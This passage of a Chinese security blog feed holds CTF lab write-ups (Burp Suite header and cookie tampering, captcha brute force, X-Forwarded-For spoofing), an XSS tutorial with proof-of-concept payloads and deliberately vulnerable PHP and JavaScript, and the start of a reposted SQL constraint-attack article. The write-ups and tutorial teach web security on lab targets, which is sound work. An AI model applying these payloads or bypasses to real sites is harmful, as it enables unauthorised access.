    <content type="html"><![CDATA[<h3 id="1-key又又找不到了小明这次哭了，key又找不到了！！！-key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！"><a href="#1-key又又找不到了小明这次哭了，key又找不到了！！！-key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！" class="headerlink" title="1.key又又找不到了小明这次哭了，key又找不到了！！！ key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！"></a>1.key又又找不到了<br>小明这次哭了，key又找不到了！！！ key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！</h3><p>burpsuite抓包在响应处发现key</p><h3 id="2-快速口算小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？"><a href="#2-快速口算小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？" class="headerlink" title="2.快速口算小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？"></a>2.快速口算<br>小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- more --&gt;</span><br><span class="line">#-*-coding:utf-8-*- </span><br><span class="line">import requests, re</span><br><span class="line">url = &apos;http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&apos;</span><br><span class="line">s = requests.session()</span><br><span class="line">c = s.get(url).content</span><br><span class="line">print c</span><br><span class="line">r = re.findall(r&apos;[\d]&#123;2,&#125;&apos;,c)</span><br><span class="line">r=int(r[0])*int(r[1])+int(r[2])*(int(r[3])+int(r[4]))</span><br><span class="line">c1 = s.post(url, data=&#123;&apos;v&apos;:r&#125;).content</span><br><span class="line">print c1.decode(&apos;utf-8&apos;)</span><br></pre></td></tr></table></figure><ul><li><a href="https://www.cnblogs.com/tina-python/p/5508402.html" target="_blank" rel="noopener">正则表达式详解</a><br></li><li>正则 re.findall  的简单用法（返回string中所有与pattern相匹配的全部字串，返回形式为数组）</li><li><a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">requests详解</a></li><li>decode的作用是将其他编码的字符串转换成unicode编码<h3 id="3-这个题目是空的"><a href="#3-这个题目是空的" class="headerlink" title="3.这个题目是空的"></a>3.这个题目是空的</h3><h3 id="Tips-这个题目真不是随便设置的。-什么才是空的呢？"><a href="#Tips-这个题目真不是随便设置的。-什么才是空的呢？" class="headerlink" title="Tips:这个题目真不是随便设置的。 什么才是空的呢？"></a>Tips:这个题目真不是随便设置的。 什么才是空的呢？</h3><h3 id="通关地址：没有，请直接提交答案-小写即可"><a href="#通关地址：没有，请直接提交答案-小写即可" class="headerlink" title="通关地址：没有，请直接提交答案(小写即可)"></a>通关地址：没有，请直接提交答案(小写即可)</h3>0,null,none,no等等试一下就出来了<br>结果为null<h3 id="4-怎么就是不弹出key呢？提交说明：提交前14个字符即可过关"><a href="#4-怎么就是不弹出key呢？提交说明：提交前14个字符即可过关" class="headerlink" title="4.怎么就是不弹出key呢？提交说明：提交前14个字符即可过关"></a>4.怎么就是不弹出key呢？<br>提交说明：提交前14个字符即可过关</h3><h4 id="这题做不出来，据说是把前面几个函数去掉即可，多次试了下还是无用"><a href="#这题做不出来，据说是把前面几个函数去掉即可，多次试了下还是无用" class="headerlink" title="这题做不出来，据说是把前面几个函数去掉即可，多次试了下还是无用"></a>这题做不出来，据说是把前面几个函数去掉即可，多次试了下还是无用</h4><h3 id="5-逗比验证码第一期逗比的验证码，有没有难道不一样吗？"><a href="#5-逗比验证码第一期逗比的验证码，有没有难道不一样吗？" class="headerlink" title="5.逗比验证码第一期逗比的验证码，有没有难道不一样吗？"></a>5.逗比验证码第一期<br>逗比的验证码，有没有难道不一样吗？</h3><img src="http://p1vrkwaxt.bkt.clouddn.com/%7D7@JZH2121QBZY28L_Q%7D%7BLO.png" alt="image"><br><br>burpsuite抓包<br><img src="http://p1vrkwaxt.bkt.clouddn.com/YD5J%60R7GM7P$E31NTYXCGX3.png" alt="image"><br><br>观察后发现Cookie是保持不变的,验证码与session对应，session会话不会被刷新，一直存在,所以可以用burpsuite intruder爆破密码<br><img src="http://p1vrkwaxt.bkt.clouddn.com/U%5D22E%25F5_~%28I%5B3%7BKDQP%7BNG3.png" alt="image"><br>pwd=1238,得到key<h3 id="6-逗比验证码第二期验证便失效的验证码"><a href="#6-逗比验证码第二期验证便失效的验证码" class="headerlink" title="6.逗比验证码第二期验证便失效的验证码"></a>6.逗比验证码第二期<br>验证便失效的验证码</h3>burpsuite测试后将验证码设置空再爆破密码</li></ul><p>据说原因是请求头包含了这两句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Connection: keep-alive  </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><h3 id="7-逗比的验证码第三期（SESSION）尼玛，验证码怎么可以这样逗比。。验证码做成这样，你家里人知道吗？"><a href="#7-逗比的验证码第三期（SESSION）尼玛，验证码怎么可以这样逗比。。验证码做成这样，你家里人知道吗？" class="headerlink" title="7.逗比的验证码第三期（SESSION）尼玛，验证码怎么可以这样逗比。。验证码做成这样，你家里人知道吗？"></a>7.逗比的验证码第三期（SESSION）<br>尼玛，验证码怎么可以这样逗比。。<br>验证码做成这样，你家里人知道吗？</h3><p>方法和第六题一样，具体原因我也不清楚，据说是第六题记录在Cookie，而第七题是记录在Session</p><h3 id="8-微笑一下就能过关了尼玛，碰到这样的题我能笑得出来嘛…"><a href="#8-微笑一下就能过关了尼玛，碰到这样的题我能笑得出来嘛…" class="headerlink" title="8.微笑一下就能过关了尼玛，碰到这样的题我能笑得出来嘛…"></a>8.微笑一下就能过关了<br>尼玛，碰到这样的题我能笑得出来嘛…</h3><p>查看源代码<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/%28LNG%2508SL%7B@%5DREHLP0U0G%25O.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-key又又找不到了小明这次哭了，key又找不到了！！！-key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！&quot;&gt;&lt;a href=&quot;#1-key又又找不到了小明这次哭了，key又找不到了！！！-key啊，你究竟藏到了哪里，为什么我看到的页面上都没
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS注入原理及应用</title>
    <link href="http://yoursite.com/2018/07/06/XSS/"/>
    <id>http://yoursite.com/2018/07/06/XSS/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:44:08.378Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><h3 id="参考书籍-《白帽子讲web安全》"><a href="#参考书籍-《白帽子讲web安全》" class="headerlink" title="参考书籍:《白帽子讲web安全》"></a>参考书籍:《白帽子讲web安全》</h3><p>XSS 跨站脚本攻击(Cross Site Script)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过(插入恶意脚本，实现对用户游览器的控制。<br><a id="more"></a></p><h3 id="XSS漏洞原理"><a href="#XSS漏洞原理" class="headerlink" title="XSS漏洞原理"></a>XSS漏洞原理</h3><p>首先在本地搭个PHP环境,代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = $_GET[&quot;param&quot;];</span><br><span class="line">echo &quot;&lt;div&gt;&quot;.$input.&quot;&lt;/div&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/ch01/xss.php?param=hello</span><br></pre></td></tr></table></figure><p>可以看到页面输出hello,那么尝试提交一段HTML代码会怎么样呢<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/ch01/xss.php?param=&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/J3R6J6VRAM2PND6%29W%7BYF%60PB.png" alt="image"></p><p>成功弹出框，说明存在XSS注入,这就是简单的XSS基本原理了.<br><br>这里有个不错的链接讲解<br><br><a href="http://netsecurity.51cto.com/art/201408/448305_all.htm" target="_blank" rel="noopener">XSS的原理分析与解剖</a></p><p>xss分为三类:<br></p><ul><li><p>反射型XSS：又称“非持久性XSS”（Non-persistent XSS），只是简单地把用户输入的数据“反射”给浏览器。</p></li><li><p>存储型XSS：又称“持久型XSS”，用户输入的数据存储在服务器端，具有很强的稳定性</p></li><li><p>DOM Based XSS：这种类型并非按照“数据是否保存在服务器端”来划分，从效果上来说也是反射型XSS，但其形成原因较特别。出于历史原因，就把他单独作为一个分类了。修改页面的DOM结点形成XSS，故称之为DOM Based XSS。</p></li></ul><p>再看如下代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function test()&#123;</span><br><span class="line">var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos; &gt;testLink&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id =&quot;t&quot; &gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;test()&quot;/&gt;</span><br></pre></td></tr></table></figure></p><p>点击”write”按钮后，会在当前页面插入一个超链接，其地址为文本框的内容。<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/X42ZFS%60KH@XIQCL%5DJI%608ORK.png" alt="image"></p><p>这里的 “write”按钮中的onclick事件调用了test()函数.而在test()函数中,修改了页面的DOM节点,通过innerHTML把一段用户数据当作HTML写入到页面中，这就造成了DOM based XSS.</p><p>接下来尝试构造如下数据:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onclick=alert(&apos;xss&apos;) //</span><br></pre></td></tr></table></figure></p><p>输入后页面代码变成了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a herf=&apos;&apos; onclick=alert(&apos;xss&apos;)//&apos;&gt;testLink&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><ul><li>第一个单引号闭合掉href的第一个单引号</li><li>//是注释符,注释掉第二个单引号</li></ul><p>点击这个新生成的链接，脚本将被执行:<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/%299IH$CB9%25%25%7DK2%5D3SGE%295C%5DR.png" alt="image"></p><p>这个就是恶意脚本的执行。<br><br>还有另一种利用方式——除了构造一个新事件外,还可以选择闭合掉标签,并插入一个新的HTML标签:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;img src=# onerror=alert(&apos;xss&apos;) /&gt;&lt;&apos;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;XSS简介&quot;&gt;&lt;a href=&quot;#XSS简介&quot; class=&quot;headerlink&quot; title=&quot;XSS简介&quot;&gt;&lt;/a&gt;XSS简介&lt;/h2&gt;&lt;h3 id=&quot;参考书籍-《白帽子讲web安全》&quot;&gt;&lt;a href=&quot;#参考书籍-《白帽子讲web安全》&quot; class=&quot;headerlink&quot; title=&quot;参考书籍:《白帽子讲web安全》&quot;&gt;&lt;/a&gt;参考书籍:《白帽子讲web安全》&lt;/h3&gt;&lt;p&gt;XSS 跨站脚本攻击(Cross Site Script)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过(插入恶意脚本，实现对用户游览器的控制。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网络安全实验室-基础关</title>
    <link href="http://yoursite.com/2018/07/06/wangluo1/"/>
    <id>http://yoursite.com/2018/07/06/wangluo1/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:43:48.351Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-key在哪里？"><a href="#1-key在哪里？" class="headerlink" title="1.key在哪里？"></a>1.key在哪里？</h3><p>查看源代码得到key</p><h3 id="2-再加密一次你就得到key啦-加密之后的数据为xrlvf23xfqwsxsqf"><a href="#2-再加密一次你就得到key啦-加密之后的数据为xrlvf23xfqwsxsqf" class="headerlink" title="2.再加密一次你就得到key啦~ 加密之后的数据为xrlvf23xfqwsxsqf"></a>2.再加密一次你就得到key啦~ <br>加密之后的数据为xrlvf23xfqwsxsqf</h3><p>rot-13就是一种编码方式，其功能是将英文字母转换为其后第十三个字母，如果超过26则绕回开头。你可以把26个字母想象成一个字母a和字母z连在一起的环。要加密某个字母，就在环上往后数13个，第十三个就是对应的密文。<br><br><a id="more"></a><br><a href="http://www.mxcz.net/tools/rot13.aspx" target="_blank" rel="noopener">rot13在线工具网站</a></p><h3 id="3-猜猜这是经过了多少次加密-加密后的字符串为-太长了此处省略"><a href="#3-猜猜这是经过了多少次加密-加密后的字符串为-太长了此处省略" class="headerlink" title="3.猜猜这是经过了多少次加密?加密后的字符串为:(太长了此处省略)"></a>3.猜猜这是经过了多少次加密?<br>加密后的字符串为:(太长了此处省略)</h3><p>容易看出是base64码，base64多次解码,由于比较麻烦，可以写个脚本跑一下，脚本如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">s = &quot;这里输入你要解码的base64&quot;</span><br><span class="line">a = 0</span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">    s = base64.decodestring(s)</span><br><span class="line">    a += 1</span><br><span class="line">except Exception:</span><br><span class="line">    print s</span><br><span class="line">    print a</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%7B009D6F82-FCC0-C39D-8FC2-F261B36C224D%7D.png" alt="image"></p><h3 id="4-据说MD5加密很安全，真的是么？"><a href="#4-据说MD5加密很安全，真的是么？" class="headerlink" title="4.据说MD5加密很安全，真的是么？"></a>4.据说MD5加密很安全，真的是么？</h3><p><a href="http://www.cmd5.com/" target="_blank" rel="noopener">http://www.cmd5.com/</a> <br><br>在线解密得到KEY：bighp</p><h3 id="5-种族歧视小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！"><a href="#5-种族歧视小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！" class="headerlink" title="5.种族歧视小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！"></a>5.种族歧视<br>小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！</h3><p>用burpsuite抓包发送到Reapeater<br><br>修改Accept-Language如下:<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/%7B5A4A3C0C-0529-1687-BCD3-DB88DBD3842C%7D.png" alt="image"></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%7B36A594FB-5870-F43A-AFD9-D6DDF62BB402%7D.png" alt="image"></p><h3 id="6-HAHA浏览器据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？"><a href="#6-HAHA浏览器据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？" class="headerlink" title="6.HAHA浏览器据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？"></a>6.HAHA浏览器<br>据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？</h3><p>burpsuite抓包 把黄色地方改为HAHA<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/%7B20831218-87B3-7C98-BC5E-44E746F47FF1%7D.png" alt="image"></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%7BFDC6762A-8CB4-8B85-E271-DD2E2DBB8510%7D.png" alt="image"></p><h3 id="7-key究竟在哪里呢上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？"><a href="#7-key究竟在哪里呢上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？" class="headerlink" title="7.key究竟在哪里呢上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？"></a>7.key究竟在哪里呢<br>上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？</h3><p>burpsuite抓包在Response响应头(Header)里发现key</p><h3 id="8-key又找不到了小明这次可真找不到key去哪里了，你能帮他找到key吗？"><a href="#8-key又找不到了小明这次可真找不到key去哪里了，你能帮他找到key吗？" class="headerlink" title="8.key又找不到了小明这次可真找不到key去哪里了，你能帮他找到key吗？"></a>8.key又找不到了<br>小明这次可真找不到key去哪里了，你能帮他找到key吗？</h3><p>用burpsuite抓包repeater发现从index.php跳转到index_no_key.php的过程中网页有一次很快的跳转<br><img src="http://p1vrkwaxt.bkt.clouddn.com/FYC%60%5B0%25WP%6049OV%7D%60@%5BR%7D%254G.png" alt="image"></p><p>这里有一个参数：Location,这是重定向，让网页跳转到index_no_key.php这个网页，<br>那么这个过程应该是这样的：在index.php网页中点击 “到这里找key”，然后会跳转到search_key.php，然后正常情况下会跳转到key_is_here_now_.php，但是在response中有个重定向location，让网页跳转到了index_no_key.php。<br><br>所以只需要把浏览器地址栏中输入：<br><a href="http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/key_is_here_now_.php" target="_blank" rel="noopener">http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/key_is_here_now_.php</a><br>就可以得到正确的key了 。</p><h3 id="9-冒充登陆用户小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？"><a href="#9-冒充登陆用户小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？" class="headerlink" title="9.冒充登陆用户小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？"></a>9.冒充登陆用户<br>小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？</h3><p>抓包如下:<br><img src="http://p1vrkwaxt.bkt.clouddn.com/JC5KYI%28U6L%5B2VXPDM5_GIBP.png" alt="image"><br>在Cookie发现login=0;尝试把0改成1后运行得到key</p><h3 id="10-比较数字大小只要比服务器上的数字大就可以了！"><a href="#10-比较数字大小只要比服务器上的数字大就可以了！" class="headerlink" title="10.比较数字大小只要比服务器上的数字大就可以了！"></a>10.比较数字大小<br>只要比服务器上的数字大就可以了！</h3><p>查看源代码，最大只能输入三个数字，输入999回显太小，有两种方法，第一种google修改最大length，第二种用火狐hackbar直接post<br><img src="http://p1vrkwaxt.bkt.clouddn.com/%5BTDFNL%609IA$@0Y_YIG%60S$AO.png" alt="image"></p><h3 id="11-本地的诱惑小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密-key-？"><a href="#11-本地的诱惑小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密-key-？" class="headerlink" title="11.本地的诱惑小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密(key)？"></a>11.本地的诱惑<br>小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密(key)？</h3><p>burpsuite抓包添加:X-Forwarded-For:127.0.0.1<br>下面给出复现的代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//print_r($_SERVER);</span><br><span class="line">$arr=explode(&apos;,&apos;,$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]);</span><br><span class="line">if($arr[0]==&apos;127.0.0.1&apos;)&#123;</span><br><span class="line">    //key</span><br><span class="line">    echo &quot;key is ^&amp;*(UIHKJjkadshf&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;必须从本地访问！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="12-就不让你访问小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方…-可最后还是被黑客找到了，并被放置了一个黑页，写到-find-you-no-more-than-3-secs"><a href="#12-就不让你访问小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方…-可最后还是被黑客找到了，并被放置了一个黑页，写到-find-you-no-more-than-3-secs" class="headerlink" title="12.就不让你访问小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs!"></a>12.就不让你访问<br>小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs!</h3><p>原理:robots协议 网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。<br><img src="http://p1vrkwaxt.bkt.clouddn.com/68%5B6192D%29VDG7ZZ$BK%5D%60F%29Y.png" alt="image"><br>访问Disallow<br><br>得到如下回显:<br></p><h4 id="you-find-me-but-I-am-not-the-login-page-keep-search"><a href="#you-find-me-but-I-am-not-the-login-page-keep-search" class="headerlink" title="you find me,but I am not the login page. keep search."></a>you find me,but I am not the login page. keep search.</h4><p>尝试输入login.php,得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-key在哪里？&quot;&gt;&lt;a href=&quot;#1-key在哪里？&quot; class=&quot;headerlink&quot; title=&quot;1.key在哪里？&quot;&gt;&lt;/a&gt;1.key在哪里？&lt;/h3&gt;&lt;p&gt;查看源代码得到key&lt;/p&gt;
&lt;h3 id=&quot;2-再加密一次你就得到key啦-加密之后的数据为xrlvf23xfqwsxsqf&quot;&gt;&lt;a href=&quot;#2-再加密一次你就得到key啦-加密之后的数据为xrlvf23xfqwsxsqf&quot; class=&quot;headerlink&quot; title=&quot;2.再加密一次你就得到key啦~ 加密之后的数据为xrlvf23xfqwsxsqf&quot;&gt;&lt;/a&gt;2.再加密一次你就得到key啦~ &lt;br&gt;加密之后的数据为xrlvf23xfqwsxsqf&lt;/h3&gt;&lt;p&gt;rot-13就是一种编码方式，其功能是将英文字母转换为其后第十三个字母，如果超过26则绕回开头。你可以把26个字母想象成一个字母a和字母z连在一起的环。要加密某个字母，就在环上往后数13个，第十三个就是对应的密文。&lt;br&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基于约束的SQL攻击</title>
    <link href="http://yoursite.com/2018/07/06/SQL%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/07/06/SQL约束攻击/</id>
    <published>2018-07-06T05:24:35.601Z</published>
    <updated>2018-07-06T10:43:20.411Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基于约束的SQL攻击"><a href="#基于约束的SQL攻击" class="headerlink" title="基于约束的SQL攻击"></a>基于约束的SQL攻击</h1><p>转载自:<a href="http://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/124537.html</a></p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>最近，我遇到了一个有趣的代码片段，开发者尝试各种方法来确保数据库的安全访问。当新用户尝试注册时，将运行以下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- more --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">// Checking whether a user with the same username exists</span><br><span class="line">$username = mysql_real_escape_string($_GET[&apos;username&apos;]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[&apos;password&apos;]);</span><br><span class="line">$query = &quot;SELECT *</span><br><span class="line">          FROM users</span><br><span class="line">          WHERE username=&apos;$username&apos;&quot;;</span><br><span class="line">$res = mysql_query($query, $database);</span><br><span class="line">if($res) &#123;</span><br><span class="line">  if(mysql_num_rows($res) &gt; 0) &#123;</span><br><span class="line">    // User exists, exit gracefully</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    // If not, only then insert a new entry</span><br><span class="line">    $query = &quot;INSERT INTO users(username, password)</span><br><span class="line">              VALUES (&apos;$username&apos;,&apos;$password&apos;)&quot;;</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用以下代码验证登录信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = mysql_real_escape_string($_GET[&apos;username&apos;]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[&apos;password&apos;]);</span><br><span class="line">$query = &quot;SELECT username FROM users</span><br><span class="line">          WHERE username=&apos;$username&apos;</span><br><span class="line">              AND password=&apos;$password&apos; &quot;;</span><br><span class="line">$res = mysql_query($query, $database);</span><br><span class="line">if($res) &#123;</span><br><span class="line">  if(mysql_num_rows($res) &gt; 0)&#123;</span><br><span class="line">      $row = mysql_fetch_assoc($res);</span><br><span class="line">      return $row[&apos;username&apos;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">return Null;</span><br></pre></td></tr></table></figure></p><p>安全考虑:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 